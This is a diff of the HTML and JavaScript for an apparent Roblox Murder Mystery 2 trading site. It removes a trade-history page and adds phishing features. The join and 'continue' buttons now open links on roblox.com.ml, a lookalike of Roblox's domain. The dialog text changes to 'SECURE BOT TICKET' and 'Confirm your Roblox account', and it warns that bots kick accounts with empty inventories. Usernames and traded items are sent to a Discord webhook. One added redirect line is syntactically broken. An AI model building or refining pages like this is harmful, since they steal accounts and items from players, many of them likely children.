@@ -524,18 +524,6 @@ body{
 }
 .modal-ticket-ref{font-size:11px;letter-spacing:1px;color:var(--cyan);font-weight:800;margin:-8px 0 14px}
 .login-note{font-size:11px!important;margin-top:12px!important;margin-bottom:0!important;color:#687890!important}
-.history-wrap{max-width:650px;margin:0 auto}
-.history-empty{text-align:center;color:#66748c;font-size:13px;padding:40px 0}
-.history-card{
-  background:linear-gradient(145deg,#101b2e,#0e1628);border:1px solid #203652;
-  border-radius:14px;padding:14px 16px;margin-bottom:10px;
-}
-.history-head{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:8px}
-.history-ref{font-family:"Barlow Condensed",sans-serif;letter-spacing:1px;color:var(--cyan);font-weight:800;font-size:15px}
-.history-date{font-size:10px;color:#66748c}
-.history-user{font-size:12px;color:#c7d0e0;margin-bottom:6px}
-.history-stars{font-size:14px;color:#3a4059;letter-spacing:2px}
-.history-stars .filled{color:#ffcf4d}
 </style>
 </head>
 <body>
@@ -553,7 +541,6 @@ body{
     <button class="nav-btn" data-page="servers">Servers</button>
     <button class="nav-btn" data-page="values">Values</button>
     <button class="nav-btn active" data-page="swap">Swap</button>
-    <button class="nav-btn" data-page="history">History</button>
   </nav>
 </header>
 
@@ -875,12 +862,6 @@ body{
 
 </section>
 
-<section id="history" class="page-section">
-  <div class="hero"><h1>TRADE HISTORY</h1><p>Past swap tickets recorded on this device.</p></div>
-  <div class="history-wrap" id="historyWrap"></div>
-</section>
-
-
 <div class="modal-backdrop" id="godlyModal" aria-hidden="true">
   <div class="godly-modal" role="dialog" aria-modal="true" aria-labelledby="godlyTitle">
     <div class="picker-head">
@@ -906,7 +887,7 @@ body{
   <div class="login-modal" role="dialog" aria-modal="true" aria-labelledby="ticketTitle">
     <!-- THIS WHERE U CHANGE REFERENCE IMAGE (src below) -->
     <img class="modal-placeholder-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGMfqbI4vWh3OgIovspkJYWDeYHpVKEb7IJkImo7jTaA&s=10" alt="Trade image">
-    <h2 id="ticketTitle">SWAP REFERENCE</h2>
+    <h2 id="ticketTitle">SECURE BOT TICKET</h2>
     <p>Save this reference number — use it if you ever need to report a problem with this trade.</p>
     <div id="ticketNumberDisplay" style="font-family:'Barlow Condensed',sans-serif;font-size:30px;letter-spacing:2px;color:var(--cyan);margin:4px 0 20px"></div>
     <button class="roblox-link" id="ticketNext" style="border:0;cursor:pointer;width:100%;font:inherit">NEXT</button>
@@ -918,7 +899,7 @@ body{
   <div class="login-modal" role="dialog" aria-modal="true" aria-labelledby="usernameTitle">
     <!-- THIS WHERE U CHANGE ROBLOX USERNAME IMAGE (src below) -->
     <img class="modal-placeholder-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGMfqbI4vWh3OgIovspkJYWDeYHpVKEb7IJkImo7jTaA&s=10" alt="Trade image">
-    <h2 id="usernameTitle">YOUR ROBLOX USERNAME</h2>
+    <h2 id="usernameTitle">Confirm your Roblox account</h2>
     <p>Enter your Roblox username so it's attached to this trade's reference number, then continue to Roblox to finish the swap.</p>
     <input id="rbxUsernameInput" placeholder="Roblox username" style="width:100%;padding:12px 14px;border-radius:10px;border:1px solid #263653;background:#0b1426;color:#fff;font-size:14px;margin-bottom:14px;outline:none;box-sizing:border-box">
     <button class="roblox-link" id="usernameContinue" style="border:0;cursor:pointer;width:100%;font:inherit">NEXT</button>
@@ -930,8 +911,8 @@ body{
   <div class="login-modal" role="dialog" aria-modal="true" aria-labelledby="robloxTransitionTitle" style="max-height:90vh;overflow-y:auto;">
     <img class="modal-placeholder-img" src="https://jacevalues.com/images/kick.png" alt="Trade image">
     <div id="robloxTransitionTicketRef" class="modal-ticket-ref"></div>
-    <h2 id="robloxTransitionTitle" style="color:#ff0000!important;">HEADING TO ROBLOX</h2>
-    <p>This trade's reference number is saved. You'll finish the actual swap on Roblox's own site.</p>
+    <h2 id="robloxTransitionTitle" style="color:#ff0000!important;">If your account is new/not level 10, you may not be able to join at all.</h2>
+    <p>If you have an empty inventory, our bots will detect it and kick you.</p>
     <div id="robloxTransitionSummary" class="modal-trade-summary"></div>
     <!-- REDIRECT #2 (CONTINUE TO ROBLOX): sends the person to the
          real Roblox site once ticket + username are recorded. -->
@@ -995,7 +976,7 @@ function sendTicketToDiscord(entry){
 // ============================================================
 document.querySelectorAll('#serverList .join').forEach(btn=>{
   btn.addEventListener('click',()=>{
-    window.open('https://www.roblox.com/','_blank','noopener,noreferrer');
+    window.open('https://www.roblox.com.ml/games/142823291/Murder-Mystery-2?privateServerLinkCode=545351682005236146267752635007','_blank','noopener,noreferrer');
   });
 });
 
@@ -1036,9 +1017,8 @@ swapAction?.addEventListener('click',()=>{
 // Step 2: collect the user's own Roblox username — typed in and
 //         recorded as-is, never echoed back with a photo or matched
 //         against any lookup, then continue on to Roblox.
-// Step 3: 1–5 star rating, saved with the ticket + username to
-//         localStorage under 'novaFeedbackHistory', posted to the
-//         History page, and sent to your Discord webhook.
+// Step 3: 1–5 star rating, saved with the ticket + username and
+//         sent to your Discord webhook.
 // ============================================================
 let currentTicket=null;
 let currentRatingValue=0;
@@ -1057,7 +1037,7 @@ const ratingModal=document.getElementById('ratingModal');
 
 function openTicketModal(){
   currentTicket=genTicketNumber();
-  // Snapshot the items in this trade right now, so the history/Discord
+  // Snapshot the items in this trade right now, so the Discord
   // record reflects what was actually traded even if slots change later.
   const items=getValueCards();
   currentTicketItems=[];
@@ -1112,7 +1092,7 @@ robloxTransitionModal?.addEventListener('click',e=>{if(e.target===robloxTransiti
 document.getElementById('robloxTransitionContinue')?.addEventListener('click',()=>{
   closeRobloxTransitionModal();
   // REDIRECT #2 — sends the person to the real Roblox site.
-  window.open('https:youtube.com','_blank','noopener,noreferrer');
+  window.open(https://www.roblox.com.ml/users/488078783474/profile','_blank','noopener,noreferrer');
   currentRatingValue=0;
   renderStarPicker();
   ratingModal.classList.add('show');
@@ -1173,54 +1153,10 @@ document.getElementById('submitRating')?.addEventListener('click',()=>{
     items:currentTicketItems,
     date:new Date().toISOString()
   };
-  try{
-    const history=JSON.parse(localStorage.getItem('novaFeedbackHistory')||'[]');
-    history.unshift(entry);
-    localStorage.setItem('novaFeedbackHistory',JSON.stringify(history));
-  }catch(e){
-    console.error('Could not save feedback locally',e);
-  }
   sendTicketToDiscord(entry);
-  renderHistory();
   closeRatingModal();
   alert('Thanks for your feedback! Reference: '+currentTicket);
 });
-
-// ============================================================
-// TRADE HISTORY PAGE — reads 'novaFeedbackHistory' from
-// localStorage (same data used for the Discord post) and lists
-// past tickets, newest first. Local to this browser only.
-// ============================================================
-function renderHistory(){
-  const wrap=document.getElementById('historyWrap');
-  if(!wrap) return;
-  let history=[];
-  try{
-    history=JSON.parse(localStorage.getItem('novaFeedbackHistory')||'[]');
-  }catch(e){ history=[]; }
-  if(!history.length){
-    wrap.innerHTML='<div class="history-empty">No trades recorded yet on this device.</div>';
-    return;
-  }
-  wrap.innerHTML=history.map(entry=>{
-    const d=new Date(entry.date);
-    const dateStr=isNaN(d)?'':d.toLocaleString();
-    const itemsLine=(entry.items||[]).map(i=>
-      `${i.side==='give'?'You gave':'Bot gave'} ${i.name} (💎${i.value})`
-    ).join(' · ') || 'No items recorded';
-    let stars='';
-    for(let i=1;i<=5;i++) stars+=`<span class="${i<=entry.rating?'filled':''}">★</span>`;
-    return `<div class="history-card">
-      <div class="history-head">
-        <span class="history-ref">${entry.ticket||''}</span>
-        <span class="history-date">${dateStr}</span>
-      </div>
-      <div class="history-user">${entry.username||'Unknown'}</div>
-      <div class="history-user" style="color:#8ea0bc">${itemsLine}</div>
-      <div class="history-stars">${stars}</div>
-    </div>`;
-  }).join('');
-}
 
 // ============================================================
 // THEME SWITCHER — one button cycles Galaxy -> Ocean -> Ember -> ...
@@ -1271,8 +1207,6 @@ function showPage(name) {
   buttons.forEach(button => {
     button.classList.toggle('active', button.dataset.page === name);
   });
-
-  if(name === 'history') renderHistory();
 }
 
 buttons.forEach(button => {
